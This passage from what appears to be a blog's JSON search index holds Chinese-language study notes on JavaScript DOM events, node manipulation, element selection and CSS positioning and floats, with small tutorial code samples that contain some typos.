先捕获再冒泡。\n>\n>  现代浏览器都遵循了此标准，所以当事件发生时，会经历3个阶段。\n\n\n\n#### DOM 事件流会经历3个阶段： \n\n \n\n1. 捕获阶段\n\n2. 当前目标阶段\n\n3. 冒泡阶段 \n\n>  我们向水里面扔一块石头，首先它会有一个下降的过程，这个过程就可以理解为从最顶层向事件发生的最具体元素（目标点）的捕获过程；之后会产生泡泡，会在最低点（ 最具体元素）之后漂浮到水面上，这个过程相当于事件冒泡。 \n\n <img src=\"https://s1.328888.xyz/2022/04/09/X1j3C.png\">\n\n<img src=\"https://s1.328888.xyz/2022/04/09/X1vEg.png\" style=\"float:left\">\n","tags":["js"],"categories":["learningNotes"]},{"title":"js事件","url":"/learningNotes/js/06注册删除事件","content":"\n### 1注册事件（绑定事件）\n\n#### \t1.1 给元素添加事件\n\n+ 传统方式: \n\n  利用on开头的事件/onclick: `btn.onclick=function(){}`\n\n  > 特点：\n  >\n  > 注册事件唯一性  （同一个元素上下点击alert，之hi显示后面的那个）\n  > 同一个元素同一个事件只能设置一个处理函数，最后注册的处理函数将会覆盖前面注册书的处理函数\n\n+ 监听方式\n  方法监听注册方式：`addEventListener()` w3c标准\n\n  > 特点：\n  >\n  > 同一个元素同一个事件可以注册多个监听器\n  > 按注册顺序依次执行上\n\n#### 1.2 事件监听方式：\n\n`eventTarget.addEventListener(type,listener[,useCapture])`\n\t将指定的监听器注册到eventTarget（目标对象），当该对象触发指定事件时，就会执行事件处理程序\n\n+ type：事件类型字符串，比如click、mouseover，这里不带on  ＋引号\n+ listener：事件处理函数，事件发生时，会调用该监听函数\n+ useCapture：可选参数，是一个布尔值，默认时false。\n  \t\n\n#### 1.3.attachEvent事件监听方式 \n\n`eventTarget.attachEvent(eventNameWithOn,callback)`\n\t将指定的监听器注册到eventTarget（目标对象上），当该对象触发指定事件时，就会执行事件处理程序\n\n + eventNameWithOn：事件类型字符串，比如onclick，这里带on\n + callback：事件处理函数，当目标触发事件时回调函数被调用\t\n + ie9以前的版本支持\n   \n\n### 2.删除事件\n\n### \t2.1事件删除的方式\n\n+ 传统注册方式：`eventTarget.onclick=null`\n+ 监听注册方式：\n  + `eventTarget.removeEventListener(type,listener[,useCapture]);`\t\t\t\t\n  + `eventTarget.detachEvent(eventNameWithOn,callback);`","tags":["js"],"categories":["learningNotes"]},{"title":"js获取元素","url":"/learningNotes/js/07事件对象","content":"\n### 1. DOM事件流\n\ndom 事件流 三个阶段：\n\n1. JS 代码中只能执行捕获或者冒泡其中的一个阶段。\n\n2. onclick 和 attachEvent（ie） 只能得到冒泡阶段。\n\n3. 捕获阶段 如果addEventListener 第三个参数是 true 那么则处于捕获阶段 \n\n   > document -> html -> body -> father -> son\n\n4. 冒泡阶段 如果addEventListener 第三个参数是 false 或者 省略 那么则处于冒泡阶段  \n\n   > son -> father ->body -> html -> document\n\n### 2. 事件对象\t\n\n1. event就是一个事件对象 `div.onclick=function(event){} |div.addEventListenter('click',function(event) {} ) `\n\n2. 事件对象只有有了事件才会存在，是系统给我们自动创建的\n\n3. 事件对象  是 事件的一系列相关数据的集合  跟事件相关的  \n\n   >  （eg：鼠标点击  包含鼠标坐标。。。  if键盘事件  包含按下哪个键）\n\n4. 这个事件对象可以自己命名，比如event->e\n\n5. 兼容性  ie678  `window.event`\n\n\n\n### 3. 事件对象常见的属性和方法\n\n\n\n| 属性\\|方法          | 行为                    | 标准              |\n| ------------------- | ----------------------- | ----------------- |\n| e.target            | 返回   触发  事件的对象 | 标准              |\n| e.srcElement        | 返回   触发  事件的对象 | 非标准  ie678使用 |\n| e.type              | 返回时间的类型          |                   |\n| e.cancelBubble      | 阻止冒泡                | 非标准  ie678使用 |\n| e.stopPropagation() | 阻止冒泡                | 标准              |\n| e.reutrnValue       | 阻止默认事件/行为       | 非标准  ie678使用 |\n| e.preventDefault()  | 阻止默认事件/行为       | 标准              |\n\n\n\n### 4. 事件委托（代理/委派）（冒泡好处）：\n\n原理：不给每个节点单独是设置事件监听器，而是将事件监听器设置再其父结点上，然后利用冒泡原理影响设置每个子节点\n\t    作用：只操作了一次DOM，提高了程序的性能\n\n事件委托的核心原理：给父节点添加侦听器， 利用事件冒泡影响每一个子节点\n\n> 比如：给ul注册事件，然后利用事件对象的target来找到当前点击的li，以为点击li，事件会冒泡到ul上，ul有注册事件，就会触发监听器\n\n```html\n<ul>\n\t    <li>xxx</li>\n\t    <li>xxx</li>\n\t    <li>xxx</li>\n\t    <li>xxx</li>\n\t    <li>xxx</li>\n</ul>\n<script>\nvar ul=document.querySelector('ul');\nul.addEventListener('click',function(e){\n\t// e.target 这个可以得到我们点击的对象   点哪个哪个背景变色\n\te.target.style.backgroundColor='pink';\n})\n</script>\n```\n\n\n\n### 5. 常用的鼠标事件\n\n#### \t5.1 禁用默认选项（了解）\n\n1. 禁止鼠标右键菜单：`contextmenu`主要控制应该何时显示上下菜单，主要用于程序员取消默认的上下文菜单\n\n   ~~~js\n   document.addEventListener('contextmenu',function(e){\n   \te.prevetDefault();\n   })\n   ~~~\n\n2. 禁止选中文字：`selectstart` 开始选中\n\n   ~~~js\n   document.addEventListener('selectstart',function(e){\n   \te.prevetDefault();\n   })\n   ~~~\n\n\n\n#### 5.2 鼠标事件对象\n\nevent对象代表时间的状态，跟事件相关的一系列信息的集合。现阶段主要是鼠标事件MouseEvent 何键盘事件KEyboardEvent\n\n+ e.clientX      返回鼠标相对于浏览器窗口可视区的X坐标\n+ e.clientY      返回鼠标相对于浏览器窗口可视区的Y坐标\n+ e.pageX      返回鼠标相对于文档页面的X坐标      IE9+支持\t  \n+ e.pageY      返回鼠标相对于文档页面的Y坐标      IE9+支持\n+ e.screenX    返回鼠标相对于电脑屏幕的X坐标    \n+ e.screenY    返回鼠标相对于电脑屏幕的Y坐标\n\n\n\n### 6.常用的键盘事件\n\n#### 6.1键盘事件对象\n\n+ onkeyup      某个键盘按键时被松开时触发\t\n\n+ onkeydown 某个键盘按键被按下时触发\t\n\n+ onkeypress  某个键盘按键被按下时  触发   但不识别功能键（ctrl   shift）\t\n\n  三个事件的顺序：keydowm--keypress--keyup\n\n> 注：keydown和keypress在文本框里的特点：他们两个事件触发时，文字还没有落入文本框中\n> \t\t       keyup事件触发时，文字就已经落入文本框里了\n\n\n\n#### 8.2键盘事件对象\n\n+ keyCode   返回该键的ASCLL值\n+ key           返回按下的值 \n\n> onkeydown  和 onkeyup不区分字母大小写，onkeypress区分字母大小写\n> 在实际开发中，我们更多的使用keydown和keyup 它能识别所有的键（包括包括功能键）\t\n> keypress不识别功能键，但是keyCode属性区分大小写，返回不同的ASCLL值\n\n","tags":["js"],"categories":["learningNotes"]},{"title":"js节点操作","url":"/learningNotes/js/04节点操作","content":"\n> 为什么学节点操作：\n>\n> 通常获取元素是\n> ​\t\t利用dom提供的方法获取元素：document. getElementById().....   //繁琐逻辑性不强\n> ​\t\t利用节点层级关系获取元素：父子兄节点关系   //逻辑性强\n\n### 2.节点概述 \n\n便签、属性、文本、注释等都是节点\n\t    一般地，节点至少有nodeType（节点类型）、nodeName(节点名称)、nodeValue（节点值）\n\n+ 元素节点   nodeType=1  \n+ 属性节点   nodeType=2      \n+ 文本节点   nodeType=3（文本节点包含文字、空格、换行等）\n\n 主要操作元素节点\n\n### 3.节点层级    \n\n1. 父级节点：`parentNode`   \n\n   得到的是离元素最近的父级节点（亲爸爸）   找不到就返回为null\n\n```js\n<div class=\"box\">\n\t<sapn class=\"erweima\">×</span>\n</div>\nvar  erweima=document.querySelector('.erweima');\n//var box=document.querySelector('.box');\n          //=erweima.parentNode;\n//console.log(box)=console.log(erweima.parentNode)；\n```\n\n2. 子节点：\n\n   + `parentNode.childNodes(标准)`  //返回所有子节点\n   + `parentnode.children(非标准) `  //只返回元素节点     是一个只读属性\n\n   兼容性ie9:\n\n   + `parentNode.firstChild | parentNode.lastChild `    //返回第一个/最后一个子节点 \n   +  `parentNode.firstElementChild | parentNode.lastElementChild`  //返回第一/最后一个元素节点  \n   +   `parentNode.children[0]  | parentNode.children[parentNode.children.length-1]`   //实际开发常用\n\n3. 兄弟节点    \n\n   + `node.nextSibling` 返回下一个兄弟节点   包含所有节点\n   + `node.previousSibling`   返回当前元素上一个兄弟节点   包含所有节点  \n\n   兼容性ie9:\n\n   + `node.nextElementSibling`   返回当前元素下一个兄弟元素节点 \n   + `node.previousElementSibling`  返回当前元素上一个兄弟元素节点\n\n\n\n### 4. 创建节点  \n\n` document.createElement('tagName')   `\n\n方法创建由tagName指定的HTML元素，因为这些元素原先不存在，是根据我们的需求动态生成的，所以我们也称为动态创建元素节点\n\n### 5.添加节点 \n\n+ `node.appendChild(child)`   node父级     child子级   \n\n  将一个节点添加到指定父节点的子节点的子节点列表末尾，类似于css里面的after伪元素\n\n+ node.insertBefore(child,指定元素)\n\n  方法将一个节点添加到父子点的指定子节点前面，类似于css里面的before伪元素\n\n\n\n\n### 6.删除节点   \n\n+ `node.removeChild(child) ` 从dom中删除一个字节点  返回删除的节点\n\n  > 阻止链接跳转需要添加javascript:void(0);或者javascript: ;\n\n\n\n### 7.复制节点   \n\n+ `node.cloneNode()` 返回调用改方法节点的一个副本 \n\n  括号参数为空/false  为浅拷贝  只复制节点本身  不克隆里面的子节点（文本）\n\n+ `node.cloneNode(true)` \n\n  括号为true 深拷贝 复制标签    复制里面的内容\n\n\n\n### 8.三种动态创建元素的区别 \n\n​\t1. `document.write()`   页面文档流加载完毕，使用  会使文档流重绘\n\n2. `element.innerHTML ` \n3. `document.createElement()`\n\n```js\n// 后两个在添加少数时无区别   但多个时\n//1. innerHTML:                         3019ms\nfunction fn(){\n\tvar d1=+new Date();\n\tvar str=\"\";\n\tfor(var i=0;i<1000;i++){   //拼接\n\t\tdocument.body.innerHTML+='<div  style=\"width:100px; height:2px; boder:1px solid blue;\">';\n\t}\n\tvar d2=+new Date();\n\t\n\tconsole.log(d2-d1);\n}\nfn();\n\n//document.createElement()  20+ms\nfunction fn(){\n\tvar d1=+new Date();\n\n\tfor(var i=0;i<1000;i++){\n\t\tvar div=document.createElement('div');\n\t\tdiv.style.width='100px';\n\t\tdiv.style.height='2px';\n\t\tdiv.style.border='1px solid red';\n\t\tdocument.body.appendChild(div);    //创建  增加\n\t}\n\tvar d2=+new Date();\n\t\n\tconsole.log(d2-d1);\n}\nfn();\n//3. innerHTML用数组   10-ms\nfunction fn(){\n\tvar d1=+new Date();\n\n\tvar array=[ ];\n\tfor(var i=0;i<1000;i++){   //拼接\n\t\tarray.push('<div  style=\"width:100px; height:2px; boder:1px solid blue;\">');\n\t}\n\tdocument.body.innerHTML=array.join('');\n\tvar d2=+new Date();\n\t\n\tconsole.log(d2-d1);\n}\nfn();\n```\n","tags":["js"],"categories":["learningNotes"]},{"title":"js事件操作","url":"/learningNotes/js/03事件操作","content":"\n### 1.改变元素内容\n\n+ element.innerText \n  从起始位置到终止位置的内容，但它去除html标签，同时空格和换行也会去掉 \n\n+ element.innerHTML \n  起始位置到终止位置的全部内容，包括html标签，同时保留空格和换行\n\n+ innerText  和  innerHTML ：\n  innerText  不识别 html 标签   非标准    去除空格和换行\n  innerHTML  识别html代码  W3C标准   保留空格和换行\n  \n  这两个属性是可读写的  可以获取元素里的内容 \n\n### 2.改变元素属性\n`element.属性='属性值'`\n\n\n\n### 3.表单元素的属性操作\n\n（type、value、checked、selected、disabled禁用）\n\n`input.type/value/checked/selected/disabled=''`\n\n\n~~~js\n\t// <button>按钮<button>\n\t// <input type=\"text\"  value=\"输入内容\">\n\t//1.获取元素\n\tvar btn=docunment.querySelector('button');\n\tvar input=document.quertSelsector('input');\n\t//2.注册事件  处理程序\n\tbtn.onclick=function(){\n\t\t//input.innerHTML='点击了'；这个是 普通盒子  比如标签里面的内容  \n\t\t//表单里面的值  文字内容是通过  value  来修改的\n\t\tinput.value='被点击了'；\n\t\t//如果想要某个表单被禁用  disabled\n\t\tthis.disabled=ture;//==btn.disabled=true;\n\t\t//this 指向的是事件函数的调用者\n\t}\n~~~\n\n\n### 4.样式属性操作\n1. `element.style`   行内样式操作   样式少  功能简单\n2. `element.className`  类名样式操作  多    样式多  功能复杂\n\n\n\n#### 4.1 element.style\n\n样式用驼峰命名法 比如fontSize    JS修改的style样式操作   产生行内样式 css权重较高   \n\n~~~js\n// div{  width:200px;  height:200px;  background-color:pink; }\n<div></div>\n//1.获取元素\nvar div=document.querySelector('div');\n//2.\ndiv.onclick=function(){\n//div.style        \n\tthis.style.backgroundColor='purple';\n\tthis.style.width='250px';\n}\n~~~\n\n#### 4.2 element.className        \n\n覆盖所有类名\n\n~~~js\n.change{ .......  }\n// <div class=\"first\">文本<div>\nvar  test=document.querySelector('div');\ntext.onclick=function(){\n\t//当前元素的类名  改为change\n\tthis.className='change';\n\t//if想保留原先类名  \n\tthis.className='first  change';\n}\n~~~\n\n\n\n### 5.操作元素之排他思想\n\n~~~html\n<button>按钮</button>\n<button>按钮</button>\n<button>按钮</button>\n<button>按钮</button>\n<button>按钮</button>\n<script>\n        //1.获取元素  \n        var btns = document.querySelectorAll('button');\n        //btns得到的是伪数组  里面的每一个元素 btns[i]\n        for (var i = 0; i < btns.length; i++) {\n            btns[i].onclick = function() {\n                // console.log(\"第\" +  + \"被点击了\");\n                for (var i = 0; i < btns.length; i++) {\n                    // btns[i].style.background = 'none';\n                    btns[i].style.backgroundColor = '';\n\n                }\n                this.style.backgroundColor = 'pink';\n            }\n        }\n</script>\n~~~\n\n\n\n### 6.自定义属性的操作 \n\n 1.  获取属性值 \n\n     `element.属性`： 内置的属性\n\n     `element.getAttribute('属性') ` ：主要获取自定义属性\n\n     \n\n 2.  设置属性值\n\n     `element.属性='值'`：主要内置属性\n\n     `element.setAttribute('属性'，'值')`:  主要自定义属性\n\n 3.  移除属性\n\n     element.removeAttribute('属性');    \n\n     \n\n### 7. h5自定义属性\n\n1. 设置h5自定义属性 \n\n   > h5自定义属性data-开头作为属性名并且赋值    \n\n    `<div data-index=\"1\"></div>` / ` element.setAttribute('data-index',2);`\n\n   \n\n2. 获取h5自定义属性 \n   \t兼容性获取: element.getAttribute('data-index');\n   h5新增: element.dataset.index或者element.dataset['index']      \n\n\t> dataset是一个集合里存放了所有以data开头的自定义属性\n\t>\n\t> //多个用驼峰式命名\n\t> 自定义属性为   data-list-name='andy'    \n\t> \t\telement.getAttribute('data-list-name')\n\t> \t\telement.dataset.listName\n\t> \t\telement.dataset['listName']\n\t\n\t","tags":["js"],"categories":["learningNotes"]},{"title":"js获取元素","url":"/learningNotes/js/01获取元素","content":"\n1. 根据ID获取：`var elememt=document.getElememtByld(id);`\n\n   返回值：object  元素对象\n\n   ~~~js\n   // <div id='time'>2019-9-9</div>\n   var timer=document.getElememtByld('time');  \n   ~~~\n\n2. 根据标签名获取： `document.getElememtsByTagName('标签名');`\n\n   返回带有指定标签名的对象的集合\n\n   返回值：获取过来元素对象集合   以伪数组的形式储存  \n\n   ~~~js\n   // <ul> <li>xxxxxx<li> <li>xxxxxx<li> <li>xxxxxx<li> </ul>\n    var lis=document.getElememtsByTagName('li');  \n   \n   // 因为是集合，所以if操作里面的元素可遍历 \n   for(var i=0;i<lis.length;i++){   \n       console.log(lis[i])  \n   }         \n   ~~~\n\n3.  得到元素里面的某些标签：`elememt.getElememtsByTagName('标签名');`\n\n   ~~~js\n   // <ul>\n   // <li>xxxxxx<li><li>xxxxxx<li><li>xxxxxx<li>\n   // </ul>\n   // <ul id='nav'>\n   // <li>ooooo<li><li>oooo<li><li>ooooo<li>\n   // </ul>\n   var nav=document.getElememtByld('nav');\n   var navLis=nav.getElememtsByTagName('li');\n   ~~~\n\n4. 通过类名获取：`document.getElememtsByClassName('类名');`\n\n   根据类名返回元素对象集合  同上伪数组形式存储\n\n   ~~~js\n   // <div class='box'>盒子</div>\n   // <div class='box'>盒子</div>\n   // <div id='nav'> <ul>  <li>首页</li> <li>产品</li>  </ul></div>\n   \n   var boxs=document.getElememtsByClassName('box');\n   ~~~\n\n5. 根据选择器获取（一个）：`document.querySelector('选择器');`\n\n   返回指定选择器的第一个元素对象  要加符号\n\n   ~~~js\n   // <div class='box'>盒子1</div>\n   // <div class='box'>盒子2</div>\n   // <div id='nav'> <ul>  <li>首页</li> <li>产品</li>  </ul></div>\n   \n   var firstBox=document.querySelector('.box');\n   var nav=document.querySelector('#nav');\n   var li=document.querySelector('li');\n   ~~~\n\n   \n\n6. 根据选择器获取（所有）：`document.querySelectorAll('选择器');`\n\n   返回指定选择器的所有元素对象  要加符号\n\n   ~~~js\n   // <div class='box'>盒子1</div>\n   // <div class='box'>盒子2</div>\n   // <div id='nav'> <ul>  <li>首页</li> <li>产品</li>  </ul></div>\n   \n   var allBox=document.querySelectorAll('.box');\n   var lis=document.querySelectorAll('li');\n   ~~~\n\n7. 获取body元素：`document.body`\n\n8.  获取html元素：`document.documentElememt`\n\n","tags":["js"],"categories":["learningNotes"]},{"title":"js事件基础","url":"/learningNotes/js/02事件基础","content":"\n### 1.事件基础： \n\n简单理解为：触发--相应机制\n\n\n\n### 2.事件组成：\n\n 事件源 事件类型 事件处理程序--事件三要素\n\n ~~~js\n   // <botton id=\"btn\">按钮</button>\n \n \t//1.事件源  事件被触发的对象\n \tvar btn=document.getElementById('btn');\n \t//2.事件类型 如何触发           事件：鼠标点击onclick\n \t//3.事件处理程序  通过一个函数赋值的方式  完成\n \tbtn.onclick=function(){   \n \tconsole.log('点击按钮');\n   }\n ~~~\n\n\n\n### 3.执行事件的步骤：\n\n   + 获取事件源  \n\n   + 注册事件（绑定事件）  \n\n   + 添加事件处理程序（采用函数赋值形式）\n\n     \n\n### 4.常见鼠标事件：\t\n   + onclick\t         点击左键\n   + onmouseover   鼠标经过\n   + onmouseout     鼠标离开\t\n   + onfocus\t         获得鼠标焦点\n   + onblur\t         失去鼠标焦点\n   + onmousemove 鼠标移动\n   + onmouseup      鼠标弹起\n   + onmousedown 鼠标按下 ","tags":["js"],"categories":["learningNotes"]},{"title":"position","url":"/learningNotes/further/position","content":"\ncss **position** 属性用于指定一个元素在文档中的定位方式。top、right、bottom、left 属性决定了该元素的最终位置。\n\n#### 定位类型\n\n+ `static`\n\n  指定元素使用正常的布局行为，即元素在文档常规流中当前的布局位置。\n\n  > 此时 `top`, `right`, `bottom`, `left` 和 `z-index `属性无效。\n\n+ `relative`\n\n  元素先放置在未添加定位时的位置，再在不改变页面布局的前提下调整元素位置（因此会在此元素未添加定位时所在位置留下空白）。\n\n  > `position:relative ` 对 `table-*-group`, `table-row`, `table-column`, `table-cell`,` table-caption` 元素无效。\n\n+ `absolute`\n\n  元素会被移出正常文档流，并不为元素预留空间，通过指定元素相对于最近的非 static 定位祖先元素的偏移，来确定元素位置。\n\n  > 绝对定位的元素可以设置外边距（margins），且不会与其他边距合并。\n\n+ `fixed`\n\n  元素会被移出正常文档流，并不为元素预留空间，而是通过指定元素相对于屏幕视口（viewport）的位置来指定元素位置。元素的位置在屏幕滚动时不会改变。打印时，元素会出现在的每页的固定位置。\n\n  > `fixed` 属性会创建新的层叠上下文。当元素祖先的 `transform`, `perspective` 或 `filter` 属性非 `none` 时，容器由视口改为该祖先。\n\n+ `stick`\n\n  元素根据正常文档流进行定位，然后相对它的*最近滚动祖先（nearest scrolling ancestor）*和 [containing block](https://developer.mozilla.org/en-US/docs/Web/CSS/Containing_block) (最近块级祖先 nearest block-level ancestor)，包括table-related元素，基于`top`, `right`, `bottom`, 和 `left`的值进行偏移。偏移值不会影响任何其他元素的位置。\n\n  > 须指定 `top`, `right`, `bottom`或`left`四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。\n\n\n\n#### 定位的特殊性\n\n  绝对定位和固定定位和浮动相似：\n\n1. 行内元素添加绝对/固定定位，可直接设置宽高                                                                                      \n2. 块级元素添加绝对/固定定位，if不给宽/高，默认大小是内容大小                                                                                    \n3.  脱标（浮动/绝对/固定）的盒子不会触发外边距塌陷\n","tags":["css"],"categories":["learningNotes"]},{"title":"浮动和清除浮动","url":"/learningNotes/further/浮动 和 清除 浮动","content":"\n#### 1.浮动是什么\n\n float CSS属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动(文档流)中移除，尽管仍然保持部分的流动性。\n\n#### 2. 值\n\n- `left` 表明元素必须浮动在其所在的块容器左侧的关键字。\n- `right` 表明元素必须浮动在其所在的块容器右侧的关键字。\n- `none` 表明元素不进行浮动的关键字。\n- `inline-start` 关键字，表明元素必须浮动在其所在块容器的开始一侧，在ltr脚本中是左侧，在rtl脚本中是右侧。\n- `inline-end` 关键字，表明元素必须浮动在其所在块容器的结束一侧，在ltr脚本中是右侧，在rtl脚本中是左侧。\n\n#### 3.浮动的特性\n\n+ 脱离标准流\n+ 浮动的元素之间不会有缝隙\n+ 浮动元素具有行内块特征\n\n#### 4.为什么要清除浮动\n\n一般在使用浮动的时候：父元素是标准流的，而且一般不设置高度，而其子元素都设置为浮动的话，父元素高度塌陷 == 0。会影响到父元素下面的兄弟元素在文档中的位置（一般其兄弟元素会被浮动元素叠在下面）。\n\n#### 5.清除浮动的方法\n\n+ 额外标签法：\n\n  在所有浮动元素后面加一个元素，如`div`，为这个块级元素添加 `clear:both;` 的样式\n\n+ `::after` 伪元素：\n\n  ~~~css\n  .clearfix::after{   /* .clearfix 是标准流的父元素 */\n      content: \" \";\n      display: block;\n      height: 0;\n      clear: both;\n  }\n  \n  .clearfix{\n      *zoom: 1;\t/* 触发hasLayout 兼容ie6、7 */\n  }\n  \n  ~~~\n\n+ 双伪元素：\n\n  ~~~css\n  .clearfix::before, .clearfix::after{\n      content: \" \";\n      display: table;\n  }\n  \n  .clearfix::after{\n      clear: both;\n  }\n  \n  .clearfix{\n      *zoom: 1;\n  }\n  ~~~\n\n+ 父元素触发[BFC](https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context)：\n\n  最常见的做法是将父元素的 `overflow` 设置为除 `visible` 的值。\n\n  可以根据不同页面的需求使用不同的方法触发父元素BFC，在不同的场景有的方法可能不能起到清除浮动的效果。\n\n  ","tags":["css"],"categories":["learningNotes"]}]